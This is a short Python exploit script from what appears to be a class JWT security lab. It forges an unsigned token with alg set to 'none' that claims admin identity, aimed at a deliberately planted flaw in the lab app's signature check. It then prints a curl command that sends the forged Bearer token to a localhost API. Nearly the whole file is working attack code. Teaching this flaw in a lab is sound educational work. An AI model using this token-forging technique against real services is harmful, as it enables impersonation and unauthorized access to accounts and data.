"""
Class JWT lab - forge an access token using planted flaw #4.

verify_jwt() in web/app.py accepts header {"alg":"none"} and returns the
payload WITHOUT checking any signature. So we can mint a token claiming any
identity (here: admin, user_id=1) and send it as a Bearer token to the API.

This script only builds the token locally; nothing is sent anywhere.
"""
import json, base64

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

# The app does token.split("."), which needs 3 parts -> trailing dot + empty sig.
header  = {"alg": "none", "typ": "JWT"}
payload = {"user_id": 1, "username": "admin", "role": "admin"}

forged = f"{b64url(json.dumps(header).encode())}.{b64url(json.dumps(payload).encode())}."

print("Forged wristband (JWT, alg=none, role=admin):")
print(forged)
print()
print("Use it against the local API, e.g.:")
print(f'  curl -H "Authorization: Bearer {forged}" http://localhost:8080/api/notes/1')
